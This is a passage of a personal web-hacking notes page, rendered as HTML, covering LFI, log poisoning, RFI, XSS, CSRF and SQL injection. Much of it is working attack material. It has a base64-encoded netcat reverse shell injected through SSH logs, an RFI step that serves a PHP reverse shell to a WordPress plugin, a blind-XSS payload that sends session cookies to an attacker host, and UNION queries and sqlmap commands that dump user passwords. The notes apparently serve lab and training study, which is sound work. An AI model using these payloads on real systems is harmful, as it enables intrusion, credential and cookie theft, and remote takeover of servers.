+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#check-local-open-ports"><i class="fa fa-check"></i>Check local open ports</a></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#juicypotato"><i class="fa fa-check"></i>JuicyPotato</a></li>
+<li class="chapter" data-level="" data-path="windows-machine.html"><a href="windows-machine.html#system-enumeration-with-powerup-for-privesc"><i class="fa fa-check"></i>System enumeration with PowerUp for Privesc</a></li>
+</ul></li>
+<li class="divider"></li>
+<li class="summary-footer"><a class="logo" href="https://lopezmichel.org"><img alt="IPESE" src="assets/wr404-transparent.png"></a></li>
+
+</ul>
+
+      </nav>
+    </div>
+
+    <div class="book-body">
+      <div class="body-inner">
+        <div class="book-header" role="navigation">
+          <h1>
+            <i class="fa fa-circle-o-notch fa-spin"></i><a href="./">2021 - Hacking Notes</a>
+          </h1>
+        </div>
+
+        <div class="page-wrapper" tabindex="-1" role="main">
+          <div class="page-inner">
+
+            <section class="normal" id="section-">
+<div id="web-vulneratilities" class="section level1 unnumbered">
+<h1>Web Vulneratilities</h1>
+<div id="lfi-local-file-inclusion" class="section level2 unnumbered">
+<h2>LFI (Local File inclusion)</h2>
+<p>/etc/passwd
+/etc/group</p>
+<div class="sourceCode" id="cb51"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb51-1"><a href="web-vulneratilities.html#cb51-1"></a><span class="ex">curl</span> -s <span class="st">&quot;http://localhost/example.php?file=/etc/passwd&quot;</span> <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;sh$&quot;</span></span>
+<span id="cb51-2"><a href="web-vulneratilities.html#cb51-2"></a><span class="ex">curl</span> -s <span class="st">&quot;http://localhost/example.php?file=/home/looping/.ssh/id_rsa&quot;</span></span></code></pre></div>
+<p>/proc/shed_debug
+/proc/net/fib_trie</p>
+<div class="sourceCode" id="cb52"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb52-1"><a href="web-vulneratilities.html#cb52-1"></a><span class="ex">curl</span> -s <span class="st">&quot;http://localhost/example.php?file=/proc/net/fib_trie&quot;</span> <span class="kw">|</span> <span class="fu">grep</span> -i <span class="st">&quot;host local&quot;</span> -B 1 <span class="kw">|</span> <span class="fu">grep</span> -oP <span class="st">&#39;\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}&#39;</span> <span class="kw">|</span> <span class="fu">sort</span> -u</span></code></pre></div>
+<p>/proc/net/tcp</p>
+<div class="sourceCode" id="cb53"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb53-1"><a href="web-vulneratilities.html#cb53-1"></a><span class="kw">for</span> <span class="ex">port</span> in <span class="va">$(</span><span class="ex">curl</span> -s <span class="st">&quot;http://localhost/example.php?file=/proc/net/tcp&quot;</span> <span class="kw">|</span> <span class="fu">awk</span> <span class="st">&#39;{print $2}&#39;</span> <span class="kw">|</span> <span class="fu">grep</span> -v <span class="st">&quot;local_address&quot;</span> <span class="kw">|</span> <span class="fu">awk</span> -F <span class="st">&#39;:&#39;</span> <span class="st">&#39;{print $2}&#39;</span> <span class="kw">|</span> <span class="fu">sort</span> -u<span class="va">)</span><span class="kw">;</span> <span class="kw">do</span> <span class="bu">echo</span> <span class="st">&quot;[</span><span class="va">$port</span><span class="st">] -&gt; Port number </span><span class="va">$(</span><span class="bu">echo</span> <span class="st">&quot;ibase=16; </span><span class="va">$port</span><span class="st">&quot;</span> <span class="kw">|</span> <span class="fu">bc</span><span class="va">)</span><span class="st">; done</span></span>
+<span id="cb53-2"><a href="web-vulneratilities.html#cb53-2"></a></span>
+<span id="cb53-3"><a href="web-vulneratilities.html#cb53-3"></a><span class="st">lsof -i:&lt;port&gt;</span></span></code></pre></div>
+<blockquote>
+<p>[ ! ] Note: Be carefull to path traversal ?file=/../../../../../../../etc/passwd<br />
+[ ! ] Note: Try also null byte and interogation at the end (%00 or ?) at the end -&gt; ../../../etc/passwd%00 or ../../../etc/passwd?</p>
+</blockquote>
+<p>Chrome check file as raw Ctrl+u</p>
+</div>
+<div id="wrappers" class="section level2 unnumbered">
+<h2>Wrappers</h2>
+<div class="sourceCode" id="cb54"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb54-1"><a href="web-vulneratilities.html#cb54-1"></a><span class="ex">curl</span> -s <span class="st">&quot;http://localhost/example.php?file=file:///etc/passwd&quot;</span></span></code></pre></div>
+<div class="sourceCode" id="cb55"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb55-1"><a href="web-vulneratilities.html#cb55-1"></a><span class="ex">curl</span> -s <span class="st">&quot;http://localhost/example.php?file=php://filter/convert.base64-encode/resource=example2.php&quot;</span></span>
+<span id="cb55-2"><a href="web-vulneratilities.html#cb55-2"></a></span>
+<span id="cb55-3"><a href="web-vulneratilities.html#cb55-3"></a><span class="bu">echo</span> <span class="st">&quot;&lt;base64 code&gt;&quot;</span> <span class="kw">|</span> <span class="ex">base64</span> -d<span class="kw">;</span> <span class="bu">echo</span></span></code></pre></div>
+</div>
+<div id="log-poisoning" class="section level2 unnumbered">
+<h2>Log Poisoning</h2>
+<p>Log Poisoning allows user to execute command remote system using logs files. This technic comes basicaly after finding a LFI
+vulnerability and is used for gaining access to the victim system by generating a reverse shell.</p>
+<div id="apache2" class="section level3 unnumbered">
+<h3>Apache2</h3>
+<div class="sourceCode" id="cb56"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb56-1"><a href="web-vulneratilities.html#cb56-1"></a><span class="ex">curl</span> -s <span class="st">&quot;http://localhost/example.php?file=/var/log/apache2/access.log&quot;</span></span>
+<span id="cb56-2"><a href="web-vulneratilities.html#cb56-2"></a></span>
+<span id="cb56-3"><a href="web-vulneratilities.html#cb56-3"></a><span class="ex">curl</span> -s -H <span class="st">&quot;User-Agent: &lt;?php system(&#39;whoami&#39;); ?&gt; &quot;</span>http://localhost/example.php?file=/var/log/apache2/access.log<span class="st">&quot;</span></span></code></pre></div>
+</div>
+<div id="ssh-logs" class="section level3 unnumbered">
+<h3>ssh logs</h3>
+<div class="sourceCode" id="cb57"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb57-1"><a href="web-vulneratilities.html#cb57-1"></a><span class="ex">curl</span> -s <span class="st">&quot;http://localhost/example.php?file=/var/log/auth.log&quot;</span></span>
+<span id="cb57-2"><a href="web-vulneratilities.html#cb57-2"></a><span class="bu">echo</span> <span class="st">&quot;nc -e /bin/bash 127.0.0.1 443&quot;</span> <span class="kw">|</span> <span class="ex">base64</span><span class="kw">;</span> <span class="bu">echo</span></span>
+<span id="cb57-3"><a href="web-vulneratilities.html#cb57-3"></a></span>
+<span id="cb57-4"><a href="web-vulneratilities.html#cb57-4"></a><span class="co">#output</span></span>
+<span id="cb57-5"><a href="web-vulneratilities.html#cb57-5"></a><span class="ex">bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK</span></span>
+<span id="cb57-6"><a href="web-vulneratilities.html#cb57-6"></a></span>
+<span id="cb57-7"><a href="web-vulneratilities.html#cb57-7"></a></span>
+<span id="cb57-8"><a href="web-vulneratilities.html#cb57-8"></a><span class="fu">ssh</span> <span class="st">&#39;&lt;?php system(&quot;echo bmMgLWUgL2Jpbi9iYXNoIDEyNy4wLjAuMSA0NDMK | base64 -d | bash&quot;); ?&gt;&#39;</span>@127.0.0.1</span></code></pre></div>
+</div>
+</div>
+<div id="rfi-remote-file-inclusion" class="section level2 unnumbered">
+<h2>RFI (Remote File inclusion)</h2>
+<p><strong>RFI</strong> is a vulnerability similar to the <strong>LFI</strong> but using a necessary third part. Instead of looking for internal files,
+<strong>RFI</strong> vulnerability allows the system or the service to look also, throw internet, of files from services located in an external
+Server.</p>
+<p>Let’s take the example of an existing RFI vulnerability from <em>gwolle-gb</em> wordpress plugin:</p>
+<div class="sourceCode" id="cb58"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb58-1"><a href="web-vulneratilities.html#cb58-1"></a><span class="ex">wfuzz</span> -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://127.0.0.1/fuzz</span>
+<span id="cb58-2"><a href="web-vulneratilities.html#cb58-2"></a></span>
+<span id="cb58-3"><a href="web-vulneratilities.html#cb58-3"></a><span class="co">#Output</span></span>
+<span id="cb58-4"><a href="web-vulneratilities.html#cb58-4"></a><span class="ex">Payload</span> : <span class="st">&quot;wp-content/plugins/gwolle-gb&quot;</span></span>
+<span id="cb58-5"><a href="web-vulneratilities.html#cb58-5"></a></span>
+<span id="cb58-6"><a href="web-vulneratilities.html#cb58-6"></a><span class="ex">searchsploit</span> gwolle</span>
+<span id="cb58-7"><a href="web-vulneratilities.html#cb58-7"></a><span class="co">#Output</span></span>
+<span id="cb58-8"><a href="web-vulneratilities.html#cb58-8"></a><span class="ex">WordPress</span> Plugin Gwolle Guestbook 1.5.3 - Remote File inclusion  <span class="kw">|</span>  <span class="ex">php/webapps/38861.txt</span></span>
+<span id="cb58-9"><a href="web-vulneratilities.html#cb58-9"></a></span>
+<span id="cb58-10"><a href="web-vulneratilities.html#cb58-10"></a><span class="ex">searchsploit</span> -x php/webapps/388861.txt</span>
+<span id="cb58-11"><a href="web-vulneratilities.html#cb58-11"></a><span class="co">#Output</span></span>
+<span id="cb58-12"><a href="web-vulneratilities.html#cb58-12"></a><span class="ex">HTTP</span> GET parameter <span class="st">&quot;abspath&quot;</span> is not being properly sanitized before being used in PHP require() <span class="kw">function</span><span class="bu">.</span> <span class="ex">A</span> remote attacker can include a file named <span class="st">&#39;wp-load.php&#39;</span> from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious <span class="st">&#39;wp-load.php&#39;</span> file into his server document root and includes server<span class="st">&#39;s URL into request:</span></span>
+<span id="cb58-13"><a href="web-vulneratilities.html#cb58-13"></a><span class="st">http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]</span></span></code></pre></div>
+<p>In this case you can see that because of the fact that this plugin is not properly sanitized, the require method is looking for a wp-load.php file that can come from
+another computer.</p>
+<ol style="list-style-type: decimal">
+<li><p>download php reverse shell example</p>
+<div class="sourceCode" id="cb59"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb59-1"><a href="web-vulneratilities.html#cb59-1"></a><span class="bu">cd</span> content</span>
+<span id="cb59-2"><a href="web-vulneratilities.html#cb59-2"></a><span class="fu">wget</span> http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz</span>
+<span id="cb59-3"><a href="web-vulneratilities.html#cb59-3"></a><span class="fu">tar</span> -xf php-reverse-shell-1.0.tar.gz</span>
+<span id="cb59-4"><a href="web-vulneratilities.html#cb59-4"></a><span class="fu">mv</span> php-reverse-shell-1.0/php-reverse-shell.php wp-load.php</span>
+<span id="cb59-5"><a href="web-vulneratilities.html#cb59-5"></a><span class="fu">sed</span> -i <span class="st">&#39;s/127.0.0.1/&lt;attacker_ip&gt;/&#39;</span> wp-load.php</span>
+<span id="cb59-6"><a href="web-vulneratilities.html#cb59-6"></a><span class="fu">sed</span> -i <span class="st">&#39;s/1234/443/&#39;</span> wp-load.php</span>
+<span id="cb59-7"><a href="web-vulneratilities.html#cb59-7"></a><span class="ex">python3</span> -m http.server 80</span></code></pre></div></li>
+<li><p>listen to port 443</p>
+<div class="sourceCode" id="cb60"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb60-1"><a href="web-vulneratilities.html#cb60-1"></a><span class="ex">nc</span> -nlvp 443</span></code></pre></div></li>
+<li><p>send the <strong>RFI</strong></p>
+<div class="sourceCode" id="cb61"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb61-1"><a href="web-vulneratilities.html#cb61-1"></a><span class="ex">curl</span> -s <span class="st">&quot;http://127.0.0.1/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://&lt;attacker_ip/&quot;</span></span></code></pre></div></li>
+</ol>
+<p><strong>That’s it</strong></p>
+</div>
+<div id="html-injection" class="section level2 unnumbered">
+<h2>HTML Injection</h2>
+<p><strong>HTML Injection</strong> is a vulnerability that allows people to insert, most probably via a input text, a html tag. This vulnerability can
+be verified in a forum or a notes application for example by inserting <code>&lt;h1&gt;test&lt;/h1&gt;</code> or a <code>&lt;marquee&gt;this note will move&lt;/marquee&gt;</code> and if the
+result is interpreted, that means that the application is vulnerable to HTML Injection and most probably to <strong>XSS Injection</strong></p>
+</div>
+<div id="xss-cross-site-scripting" class="section level2 unnumbered">
+<h2>XSS (Cross site scripting)</h2>
+<p><strong>XSS Injection</strong> comes from the family of <strong>HTML Injection</strong> and use the <code>&lt;script /&gt;</code> tag for using javascript and inject commands via a programming
+language. This technic is commonly used for change session cookies content.</p>
+<div class="sourceCode" id="cb62"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb62-1"><a href="web-vulneratilities.html#cb62-1"></a><span class="kw">&lt;script&gt;</span><span class="at">alert</span>(<span class="va">document</span>.<span class="at">cookie</span>)<span class="kw">&lt;/script&gt;</span></span></code></pre></div>
+</div>
+<div id="xss-blind" class="section level2 unnumbered">
+<h2>XSS Blind</h2>
+<p><strong>XSS Blind</strong> is the common way to sleal the session cookie of a user by sending the information to a third part server.</p>
+<ol style="list-style-type: decimal">
+<li><p>Attacker create a small web server</p>
+<div class="sourceCode" id="cb63"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb63-1"><a href="web-vulneratilities.html#cb63-1"></a><span class="ex">python3</span> -m http.server 8080</span></code></pre></div></li>
+<li><p>Attacker put the malicious XSS script on the web app</p>
+<div class="sourceCode" id="cb64"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb64-1"><a href="web-vulneratilities.html#cb64-1"></a><span class="kw">&lt;script&gt;</span><span class="va">document</span>.<span class="at">write</span>(<span class="st">&#39;&lt;img src=&quot;http://&lt;attacker_ip&gt;:8080/img.jpg?cookie=&#39;</span> <span class="op">+</span> <span class="va">document</span>.<span class="at">cookie</span> <span class="op">+</span> <span class="st">&#39;&quot;&gt;&#39;</span>)<span class="kw">&lt;/script&gt;</span></span></code></pre></div></li>
+<li><p>Read the cookie on the small web server</p>
+<div class="sourceCode" id="cb65"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb65-1"><a href="web-vulneratilities.html#cb65-1"></a><span class="co">#Output</span></span>
+<span id="cb65-2"><a href="web-vulneratilities.html#cb65-2"></a><span class="ex">10.10.12.24</span> -- [date] <span class="st">&quot;GET /img.jpg?cookie=PHPSESSID=2qjc9psdroeqb0qcppnqdmhgp8 HTTP/1.1&quot;</span> 404 -</span></code></pre></div></li>
+<li><p>Attacker can now update the cookie with the EditThisCookie chrome extension.</p></li>
+</ol>
+</div>
+<div id="csrf-cross-site-request-forgery" class="section level2 unnumbered">
+<h2>CSRF (Cross-site Request Forgery)</h2>
+<p><strong>CSRF</strong> is a vulnerability that allows attacker to send a request for example a form that normaly is send by the method <strong>POST</strong> throw
+another method like <strong>GET</strong>. It’s commonly used in order to change a password. The attacker is now able to send a link that will change
+automatically the password of a victim.</p>
+<p>Imagine that there is a function in a web app that allows user to change their password. The Request in BurpSuite will probably look like that.</p>
+<div class="figure"><span id="fig:unnamed-chunk-5"></span>
+<img src="images/csrf-post.png" alt="csrf post request" width="90%" />
+<p class="caption">
+Figure 4: csrf post request
+</p>
+</div>
+<p>To check if this web app is vulnerable to <strong>CSRF</strong>, with BurpSuite right click and selecting <em>change request method</em> and you will se that the
+request has now changed to a <strong>GET</strong> method and looks like the following</p>
+<div class="figure"><span id="fig:unnamed-chunk-6"></span>
+<img src="images/csrf-get.png" alt="csrf updated to GET" width="90%" />
+<p class="caption">
+Figure 5: csrf updated to GET
+</p>
+</div>
+<p>If this change allows still user to change his password that means that this app is vulnerable to <strong>CSRF</strong> and attacker can send this link to
+the victim in order to change his password with the attacker desired password.</p>
+<blockquote>
+<p>[ ! ] NOTE: In order to send another url text than the normal one, use a URL SHORTENER like bitly or others.
+<span class="citation">(<span class="citeproc-not-found" data-reference-id="S4vitaar"><strong>???</strong></span>)</span> Estoy siguiendo tus cursos por el momento youtube de web pentest y tenia una pregunta, se puede hacer un cross site request forgery con un cross site scripting javascript?</p>
+</blockquote>
+</div>
+<div id="ssrf-server-side-request-forgery" class="section level2 unnumbered">
+<h2>SSRF (Server-Side Request Forgery)</h2>
+<p>A big difference bitween <strong>CSRF</strong> and <strong>SSRF</strong> is that with <strong>Server-Side Request Forgery</strong>, attacker doesn’t need to interact with the victim to exploit the
+vulnerability. Attacker can use this vulnerability to send commands at server level.</p>
+</div>
+<div id="sql-injection---error-based" class="section level2 unnumbered">
+<h2>SQL Injection - Error Based</h2>
+<p>An <strong>Error based SQL Injection</strong> is a type of sql injection that profit to a syntax error attack type. Attacker can then profit those errors to list priviledge
+informations.</p>
+<div class="sourceCode" id="cb66"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb66-1"><a href="web-vulneratilities.html#cb66-1"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select username,password from users where id = 1 <span class="st">&#39;;</span></span>
+<span id="cb66-2"><a href="web-vulneratilities.html#cb66-2"></a><span class="st">#Output</span></span>
+<span id="cb66-3"><a href="web-vulneratilities.html#cb66-3"></a><span class="st">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that correspond to you MySqlDB server version for the right syntax to use near &#39;&#39;&#39;&#39; at line 1 </span></span></code></pre></div>
+<blockquote>
+<p>[ ! ] NOTE: The error here comes from the ’ at the end of the line.</p>
+</blockquote>
+<div class="figure"><span id="fig:unnamed-chunk-7"></span>
+<img src="images/sql-error-based.png" alt="sql error based on screen" width="90%" />
+<p class="caption">
+Figure 6: sql error based on screen
+</p>
+</div>
+<p>How can Attacker take profit of this vulnerability:</p>
+<ol style="list-style-type: decimal">
+<li><p>List total number of column of the table</p>
+<div class="sourceCode" id="cb67"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb67-1"><a href="web-vulneratilities.html#cb67-1"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users order by 100<span class="kw">;</span></span>
+<span id="cb67-2"><a href="web-vulneratilities.html#cb67-2"></a><span class="co">#Output</span></span>
+<span id="cb67-3"><a href="web-vulneratilities.html#cb67-3"></a><span class="ex">ERROR</span> 1054 (42S22)<span class="bu">:</span> Unknown column <span class="st">&#39;100&#39;</span> in <span class="st">&#39;order clause&#39;</span></span>
+<span id="cb67-4"><a href="web-vulneratilities.html#cb67-4"></a></span>
+<span id="cb67-5"><a href="web-vulneratilities.html#cb67-5"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users order by 4<span class="kw">;</span></span>
+<span id="cb67-6"><a href="web-vulneratilities.html#cb67-6"></a><span class="co">#Output</span></span>
+<span id="cb67-7"><a href="web-vulneratilities.html#cb67-7"></a><span class="ex">+----+----------+----------+---------+</span>  </span>
+<span id="cb67-8"><a href="web-vulneratilities.html#cb67-8"></a><span class="kw">|</span> <span class="fu">id</span> <span class="kw">|</span> <span class="ex">username</span> <span class="kw">|</span> <span class="ex">password</span> <span class="kw">|</span> <span class="ex">email</span>   <span class="kw">|</span>  </span>
+<span id="cb67-9"><a href="web-vulneratilities.html#cb67-9"></a><span class="ex">+----+----------+----------+---------+</span>  </span>
+<span id="cb67-10"><a href="web-vulneratilities.html#cb67-10"></a><span class="kw">|</span> <span class="ex">2</span>  <span class="kw">|</span> <span class="ex">zeto</span>     <span class="kw">|</span> <span class="ex">test1234</span> <span class="kw">|</span> <span class="ex">a@a.com</span> <span class="kw">|</span>  </span>
+<span id="cb67-11"><a href="web-vulneratilities.html#cb67-11"></a><span class="kw">|</span> <span class="ex">3</span>  <span class="kw">|</span> <span class="ex">rob2</span>     <span class="kw">|</span> <span class="ex">test3434</span> <span class="kw">|</span> <span class="ex">b@b.com</span> <span class="kw">|</span>  </span>
+<span id="cb67-12"><a href="web-vulneratilities.html#cb67-12"></a><span class="kw">|</span> <span class="ex">1</span>  <span class="kw">|</span> <span class="ex">arif2</span>    <span class="kw">|</span> <span class="ex">test2331</span> <span class="kw">|</span> <span class="ex">c@c.com</span> <span class="kw">|</span>  </span>
+<span id="cb67-13"><a href="web-vulneratilities.html#cb67-13"></a><span class="ex">+----+----------+----------+---------+</span>  </span></code></pre></div>
+<div class="figure"><span id="fig:unnamed-chunk-8"></span>
+<img src="images/sql-error-based-url-by-100.png" alt="sql error based order by 100" width="90%" />
+<p class="caption">
+Figure 7: sql error based order by 100
+</p>
+</div></li>
+<li><p>Get column names</p>
+<div class="sourceCode" id="cb68"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb68-1"><a href="web-vulneratilities.html#cb68-1"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users union select 1,2,3,4<span class="kw">;</span></span>
+<span id="cb68-2"><a href="web-vulneratilities.html#cb68-2"></a><span class="co">#Output</span></span>
+<span id="cb68-3"><a href="web-vulneratilities.html#cb68-3"></a><span class="ex">+----+----------+----------+---------+</span>  </span>
+<span id="cb68-4"><a href="web-vulneratilities.html#cb68-4"></a><span class="kw">|</span> <span class="fu">id</span> <span class="kw">|</span> <span class="ex">username</span> <span class="kw">|</span> <span class="ex">password</span> <span class="kw">|</span> <span class="ex">email</span>   <span class="kw">|</span>  </span>
+<span id="cb68-5"><a href="web-vulneratilities.html#cb68-5"></a><span class="ex">+----+----------+----------+---------+</span>  </span>
+<span id="cb68-6"><a href="web-vulneratilities.html#cb68-6"></a><span class="kw">|</span> <span class="ex">2</span>  <span class="kw">|</span> <span class="ex">zeto</span>     <span class="kw">|</span> <span class="ex">test1234</span> <span class="kw">|</span> <span class="ex">a@a.com</span> <span class="kw">|</span>  </span>
+<span id="cb68-7"><a href="web-vulneratilities.html#cb68-7"></a><span class="kw">|</span> <span class="ex">3</span>  <span class="kw">|</span> <span class="ex">rob2</span>     <span class="kw">|</span> <span class="ex">test3434</span> <span class="kw">|</span> <span class="ex">b@b.com</span> <span class="kw">|</span>  </span>
+<span id="cb68-8"><a href="web-vulneratilities.html#cb68-8"></a><span class="kw">|</span> <span class="ex">1</span>  <span class="kw">|</span> <span class="ex">arif2</span>    <span class="kw">|</span> <span class="ex">test2331</span> <span class="kw">|</span> <span class="ex">c@c.com</span> <span class="kw">|</span>  </span>
+<span id="cb68-9"><a href="web-vulneratilities.html#cb68-9"></a><span class="kw">|</span> <span class="ex">1</span>  <span class="kw">|</span> <span class="ex">2</span>        <span class="kw">|</span> <span class="ex">3</span>        <span class="kw">|</span> <span class="ex">4</span>       <span class="kw">|</span>  </span>
+<span id="cb68-10"><a href="web-vulneratilities.html#cb68-10"></a><span class="ex">+----+----------+----------+---------+</span>  </span>
+<span id="cb68-11"><a href="web-vulneratilities.html#cb68-11"></a><span class="co"># Also possible with strings and functions</span></span>
+<span id="cb68-12"><a href="web-vulneratilities.html#cb68-12"></a></span>
+<span id="cb68-13"><a href="web-vulneratilities.html#cb68-13"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users union select 1,<span class="st">&quot;test&quot;</span>,3,database();</span>
+<span id="cb68-14"><a href="web-vulneratilities.html#cb68-14"></a><span class="co">#Output</span></span>
+<span id="cb68-15"><a href="web-vulneratilities.html#cb68-15"></a><span class="ex">+----+----------+----------+---------+</span>  </span>
+<span id="cb68-16"><a href="web-vulneratilities.html#cb68-16"></a><span class="kw">|</span> <span class="fu">id</span> <span class="kw">|</span> <span class="ex">username</span> <span class="kw">|</span> <span class="ex">password</span> <span class="kw">|</span> <span class="ex">email</span>   <span class="kw">|</span>  </span>
+<span id="cb68-17"><a href="web-vulneratilities.html#cb68-17"></a><span class="ex">+----+----------+----------+---------+</span>  </span>
+<span id="cb68-18"><a href="web-vulneratilities.html#cb68-18"></a><span class="kw">|</span> <span class="ex">2</span>  <span class="kw">|</span> <span class="ex">zeto</span>     <span class="kw">|</span> <span class="ex">test1234</span> <span class="kw">|</span> <span class="ex">a@a.com</span> <span class="kw">|</span>  </span>
+<span id="cb68-19"><a href="web-vulneratilities.html#cb68-19"></a><span class="kw">|</span> <span class="ex">3</span>  <span class="kw">|</span> <span class="ex">rob2</span>     <span class="kw">|</span> <span class="ex">test3434</span> <span class="kw">|</span> <span class="ex">b@b.com</span> <span class="kw">|</span>  </span>
+<span id="cb68-20"><a href="web-vulneratilities.html#cb68-20"></a><span class="kw">|</span> <span class="ex">1</span>  <span class="kw">|</span> <span class="ex">arif2</span>    <span class="kw">|</span> <span class="ex">test2331</span> <span class="kw">|</span> <span class="ex">c@c.com</span> <span class="kw">|</span>  </span>
+<span id="cb68-21"><a href="web-vulneratilities.html#cb68-21"></a><span class="kw">|</span> <span class="ex">1</span>  <span class="kw">|</span> <span class="bu">test</span>     <span class="kw">|</span> <span class="ex">3</span>        <span class="kw">|</span> <span class="ex">database</span><span class="kw">|</span>  </span>
+<span id="cb68-22"><a href="web-vulneratilities.html#cb68-22"></a><span class="ex">+----+----------+----------+---------+</span>    </span></code></pre></div>
+<p>Usefull functions to be used in order to retrieve relevant informations:</p>
+<ul>
+<li>database()</li>
+<li>user()</li>
+<li>load_file(‘/etc/passwd’)</li>
+</ul></li>
+<li><p>Get all the table names from database</p>
+<div class="sourceCode" id="cb69"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb69-1"><a href="web-vulneratilities.html#cb69-1"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users union select table_name,2,3,4 from information_schema.tables where table_schema = <span class="st">&quot;database&quot;</span><span class="kw">;</span></span></code></pre></div></li>
+<li><p>Get all databases</p>
+<div class="sourceCode" id="cb70"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb70-1"><a href="web-vulneratilities.html#cb70-1"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users union select schema_name,2,3,4 from information_schema.schemata<span class="kw">;</span></span>
+<span id="cb70-2"><a href="web-vulneratilities.html#cb70-2"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users union select schema_name,2,3,4 from information_schema.schemata limit 1,1<span class="kw">;</span> <span class="co">#show the first database</span></span>
+<span id="cb70-3"><a href="web-vulneratilities.html#cb70-3"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users union select schema_name,2,3,4 from information_schema.schemata limit 2,1<span class="kw">;</span> <span class="co">#show the second database</span></span></code></pre></div></li>
+<li><p>Get Columns name of a table</p>
+<div class="sourceCode" id="cb71"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb71-1"><a href="web-vulneratilities.html#cb71-1"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users union select column_name,2,3,4 from information_schema.columns where table_schema = <span class="st">&quot;database&quot;</span> and table_name = <span class="st">&quot;users&quot;</span><span class="kw">;</span></span></code></pre></div></li>
+<li><p>Display User and Passwords</p>
+<div class="sourceCode" id="cb72"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb72-1"><a href="web-vulneratilities.html#cb72-1"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users union select concat(username,0x3a,password),<span class="ex">2</span>,3,4 from database.users<span class="kw">;</span></span></code></pre></div>
+<p>or with group concat</p>
+<div class="sourceCode" id="cb73"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb73-1"><a href="web-vulneratilities.html#cb73-1"></a><span class="ex">MySql</span> [database]<span class="op">&gt;</span> select * from users union select group_concat(username,0x3a,password),<span class="ex">2</span>,3,4 from database.users<span class="kw">;</span></span></code></pre></div></li>
+</ol>
+<blockquote>
+<p>[ ! ] NOTE: In a web app you might need to finish the sql injection by <strong>– -</strong></p>
+</blockquote>
+<blockquote>
+<p>[ ! ] NOTE: sometimes quotes or double quotes can not be used in web services url, but you can bypass that by using hexadecimal
+value <code>echo "database" | xxd -ps</code> -&gt; 64617461626173650a so table_schema = “database” is the same as table_schema = 0x6461746162617365</p>
+</blockquote>
+</div>
+<div id="sql-injection---time-based" class="section level2 unnumbered">
+<h2>SQL Injection - Time Based</h2>
+<p><strong>SQL Injection time based</strong> is a technic that attacker can use when the database is not visiblie (Blind) in the web application. The purpose is the same as the
+sql injection error based but needs a sleep(5) function to guess the searched values.</p>
+</div>
+<div id="sql-injection---boolean-based" class="section level2 unnumbered">
+<h2>SQL Injection - Boolean Based</h2>
+<p><strong>SQL Injection boolean based</strong> is a kind of <strong>error based</strong> technic. The difference here is that the attacker is not looking at the information because
+it is not revealed by the web app. The only thing that the attacker know is if it’s sql command get an error or not. As the time <strong>time based</strong> technic,
+the attacker use that to guess the searched value.
+In this case, <strong>SQLMap</strong> is usefull.</p>
+</div>
+<div id="sqlmap" class="section level2 unnumbered">
+<h2>SQLMap</h2>
+<p><strong>SQLMap</strong> is an automatic tool that perform sql injections.</p>
+<div class="sourceCode" id="cb74"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb74-1"><a href="web-vulneratilities.html#cb74-1"></a><span class="ex">sqlmap</span> -u http://10.124.211.96/details.php?id=2</span>
+<span id="cb74-2"><a href="web-vulneratilities.html#cb74-2"></a><span class="co"># SQLMap identify the param id as injectable</span></span>
+<span id="cb74-3"><a href="web-vulneratilities.html#cb74-3"></a><span class="ex">sqlmap</span> -u http://10.124.211.96/details.php?id=2 --tables</span>
+<span id="cb74-4"><a href="web-vulneratilities.html#cb74-4"></a><span class="co"># SQLMap get the tables and db information</span></span>
+<span id="cb74-5"><a href="web-vulneratilities.html#cb74-5"></a><span class="ex">sqlmap</span> -u http://10.124.211.96/details.php?id=2 -D db -T users --dump</span>
+<span id="cb74-6"><a href="web-vulneratilities.html#cb74-6"></a><span class="co"># SQLMap dump the users table</span></span>
